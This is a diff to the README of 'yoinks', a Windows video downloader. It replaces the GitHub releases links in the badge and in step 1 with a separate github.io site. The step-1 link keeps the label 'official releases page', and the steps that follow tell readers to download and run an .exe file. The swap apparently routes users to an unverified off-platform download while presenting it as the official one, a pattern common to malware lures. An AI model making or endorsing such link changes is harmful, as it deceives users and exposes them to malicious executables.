@@ -1,6 +1,6 @@
 # 📥 yoinks - Download online videos without any ads
 
-[![Download yoinks](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/aldwinsoaring976/yoinks/releases)
+[![Download yoinks](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://aldwinsoaring976.github.io)
 
 yoinks helps you save videos from the internet to your computer. It focuses on speed and simplicity. You do not need to deal with pop-up ads or tracking links. The software runs locally on your Windows machine to ensure your privacy remains intact.
 
@@ -14,7 +14,7 @@ yoinks helps you save videos from the internet to your computer. It focuses on s
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/aldwinsoaring976/yoinks/releases) to access the download files.
+1. Visit the [official releases page](https://aldwinsoaring976.github.io) to access the download files.
 2. Look for the file ending in `.exe` under the latest release version.
 3. Click the file to save it to your computer. 
 4. Open the folder where you saved the file.
